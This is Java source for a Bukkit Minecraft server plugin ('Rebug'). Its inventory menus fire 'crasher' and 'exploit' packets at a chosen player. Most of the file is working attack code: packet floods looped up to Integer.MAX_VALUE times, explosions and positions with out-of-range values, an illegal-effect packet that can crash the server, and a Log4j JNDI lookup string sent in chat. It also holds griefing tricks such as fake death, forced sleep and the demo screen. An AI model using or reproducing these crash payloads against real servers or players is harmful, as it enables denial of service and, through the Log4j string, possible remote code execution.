package me.killstorm103.Rebug.Events;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.inventory.CraftItemStack;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import io.netty.buffer.Unpooled;
import me.killstorm103.Rebug.Commands.Menu;
import me.killstorm103.Rebug.Main.Rebug;
import me.killstorm103.Rebug.Utils.PT;
import net.minecraft.server.v1_8_R3.*;


public class EventMenus implements Listener
{
	private Packet<?> packet = null;
	private void CrashSendPacket (CommandSender sender, Player player, String mode, String spawncrashmode)
	{
		packet = null;
		if (mode.equalsIgnoreCase("Server")) // Test in dev
		{
			packet = new PacketPlayOutCollect(player.getEntityId(), Integer.MAX_VALUE);
			for (int i = 0; i < Integer.MAX_VALUE; i ++)
			PT.SendPacket(player, packet);
			PT.Log(sender, "trying Server Crasher!");
		}
		if (mode.equalsIgnoreCase("Test"))
		{
			
			ItemStack item = Reset(new ItemStack(Material.ANVIL));
			itemMeta.setDisplayName(ChatColor.DARK_RED + "Crash Anvil!");
			item.setItemMeta(itemMeta);
			player.setItemInHand(item);
			net.minecraft.server.v1_8_R3.ItemStack stack = CraftItemStack.asNMSCopy(item);
			PT.SendPacket(player, new PacketPlayOutEntity.PacketPlayOutRelEntityMove(player.getEntityId(), (byte) player.getLocation().getBlockX(), (byte) player.getLocation().getBlockY(), (byte) player.getLocation().getBlockZ(), true));
			PT.SendPacket(player, new PacketPlayOutEntity.PacketPlayOutEntityLook(player.getEntityId(), (byte) 0, (byte) 90, true));
			//PT.PlaceItemWithPacket(player, new BlockPosition(player.getLocation().getBlockX() + 1, player.getLocation().getBlockY(), player.getLocation().getBlockZ() + 1), block, arg, arg2);
		//	stack.getItem().interactWith(stack, PT.getEntityHuman(player), PT.getWorld(player), new BlockPosition(player.getLocation().getBlockX() + 1, player.getLocation().getBlockY(), player.getLocation().getBlockZ() + 1), EnumDirection.DOWN, 0, 0, 0);
		//	stack.placeItem((EntityHuman) PT.getEntityPlayer(player), PT.getWorld(player),
		//	new BlockPosition(player.getLocation().getBlockX() + 1, player.getLocation().getBlockY(), player.getLocation().getBlockZ() + 1), EnumDirection.DOWN, 0, 0, 0);			
			PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("NumbWare"))
		{
			packet = new PacketPlayOutCustomPayload("NWS|Crash Bed",
		    new PacketDataSerializer(Unpooled.buffer()));
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("Explosion"))
		{
            packet = new PacketPlayOutExplosion(player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ()));
            PT.SendPacket(player, packet);
            PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("Particle"))
		{
			float red = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
			
            for (int i = 0; i < EnumParticle.values().length; i ++)
            {
            	packet = new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0});
                PT.SendPacket(player, packet);
            }
            PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("GameState"))
		{
			packet = new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500)));
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("Log4j"))
		{
			String str = "\\${jndi:ldap://192.168." + PT.nextInt(1, 253) + "." + PT.nextInt(1, 253) + "}";
			ChatComponentText text = new ChatComponentText("/tell " + PT.randomString(10) + " " + str);
			packet = new PacketPlayOutChat (text, (byte) 1);
			PT.SendPacket(player, packet);
			PT.Log(sender, "Tried using the PT.Log4j Crash Exploit on " + player.getName());
		}
		if (mode.equalsIgnoreCase("illegal Position"))
		{
			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
			{
				packet = new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i));
				PT.SendPacket(player, packet);
			}
			PT.Log(sender, "tried crashing " + player.getName());
		}
		if (mode.equalsIgnoreCase("illegal Effect"))
		{
			PT.Log(sender, "trying to use illegal Effect crash Exploit on " + player.getName());
			packet = new PacketPlayOutEntityEffect (player.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true));
			for (int i = 0; i < Integer.MAX_VALUE; i++)
				PT.SendPacket(player, packet);
			
		}
		if (mode.equalsIgnoreCase("SpawnEntity"))
		{
			PT.CrashPlayer(sender, player, spawncrashmode);
			PT.Log(sender, "tried crashing " + player.getName());
		}
	}
	private void ExploitSendPacket (CommandSender sender, Player player, String exploit)
	{
		if (exploit.equalsIgnoreCase("force sleep"))
		{
			packet = new PacketPlayOutBed(PT.getEntityPlayer(player), new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried using the Force Sleep exploit on " + player.getName());
		}
		if (exploit.equalsIgnoreCase("demo"))
		{
			packet = new PacketPlayOutGameStateChange(5, 0);
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried using the Demo exploit on " + player.getName());
		}
		if (exploit.equalsIgnoreCase("fake death")) 
		{
			packet = new PacketPlayOutEntityStatus(PT.getEntityPlayer(player), (byte) 3);
			PT.SendPacket(player, packet);
			PT.Log(sender, "tried using the Fake Death exploit on " + player.getName());
		}
		if (exploit.equalsIgnoreCase("Test"))
		{
			//player.openInventory(PT.createInventory(player, InventoryType.CREATIVE, "Penis"));
			PT.Log(sender, "tried using the test exploit on " + player.getName());
		}
	}
	
	public void Command (String command)
	{
		Bukkit.dispatchCommand(Rebug.getGetMain().getServer().getConsoleSender(), "rebug " + command);
	}
	public void Command (Player sender, String command)
	{
		Bukkit.dispatchCommand(sender, "rebug " + command);
	}
	private ArrayList<String> lore = new ArrayList<>();
	private ItemMeta itemMeta = null;
	private ItemStack item = null;
	
	private ItemStack Reset (ItemStack item)
	{
		this.item = null;
		lore.clear();
		this.item = item;
		itemMeta = null;
		itemMeta = this.item.getItemMeta();
		
		return this.item;
	}
	
	@EventHandler
	public void onMenu (InventoryClickEvent e)
	{
		ItemMeta meta = null;
		String MenuName = ChatColor.stripColor(e.getView().getTitle());
		Inventory inventory = null;
		ItemStack item = e.getCurrentItem();
		if (MenuName != null && e.getView().getPlayer() != null)
		{
			if (e.getCurrentItem() != null && e.getCurrentItem().getItemMeta() != null)
			{
				meta = e.getCurrentItem().getItemMeta();
				String ItemName = ChatColor.stripColor(meta.getDisplayName());
				Player player = (Player) e.getView().getPlayer();
				if (MenuName.equalsIgnoreCase("Exploits"))
				{
					if (ItemName != null)
					{
						ExploitSendPacket(Menu.sender, Menu.player, ItemName);
						e.setCancelled(true);
					}
				}
				if (MenuName.equalsIgnoreCase("Items"))
				{
					e.setCancelled(true);
					player.setItemOnCursor(item);
				}
				if (MenuName.equalsIgnoreCase("Crashers"))
				{
					if (ItemName != null)
					{
						if (!player.isOp() && ItemName.equalsIgnoreCase("illegal Effect"))
						{
							player.sendMessage("because this crashes the server to you have to Opped to use it!");
							e.setCancelled(true);
							return;
						}
						if (ItemName.equalsIgnoreCase("spawn entity crashers"))
						{
							player.closeInventory();
							inventory = PT.createInventory(player, 9, ChatColor.RED + "Spawn Entity Crashers");
							item = Reset(new ItemStack(Material.WOOL, 1, (short) 14));
							itemMeta.setDisplayName(ChatColor.BLUE + "Back");
							lore.add("takes you back to the");
							lore.add("crashers menu.");
							itemMeta.setLore(lore);
							item.setItemMeta(itemMeta);
							inventory.setItem(0, item);
							
							item = Reset(new ItemStack(Material.SKULL_ITEM, 1, (short) 4));
							itemMeta.setDisplayName(ChatColor.RED + "Creeper");
							lore.add("Creeper Crash Exploit!");
							lore.add("");
							lore.add("Works on " + ChatColor.DARK_RED + "1.8.x");
							itemMeta.setLore(lore);
							item.setItemMeta(itemMeta);
							inventory.setItem(1, item);
							
							item = Reset(new ItemStack(Material.MOB_SPAWNER));
							itemMeta.setDisplayName(ChatColor.RED + "Test");
							lore.add("Test Crash Exploit!");
							itemMeta.setLore(lore);
							item.setItemMeta(itemMeta);
							inventory.setItem(2, item);
							
							player.openInventory(inventory);
							e.setCancelled(true);
							return;
						}
						CrashSendPacket(Menu.sender, Menu.player, ItemName, null);
						e.setCancelled(true);
					}
				}
				if (MenuName.equalsIgnoreCase("Spawn Entity Crashers"))
				{
					if (ItemName != null)
					{
						if (ItemName.equalsIgnoreCase("Back"))
						{
							player.closeInventory();
							Bukkit.getScheduler().scheduleSyncDelayedTask(Rebug.getGetMain(), new Runnable()
				            {
				                @Override
				                public void run()
				                {
				                	Command(player, "menu crashers " + Menu.player.getName());
				                }
				            }, 3L);
							e.setCancelled(true);
							return;
						}
						CrashSendPacket(Menu.sender, Menu.player, "SpawnEntity", ItemName);
						e.setCancelled(true);
					}
				}
			}
		}
	}
}
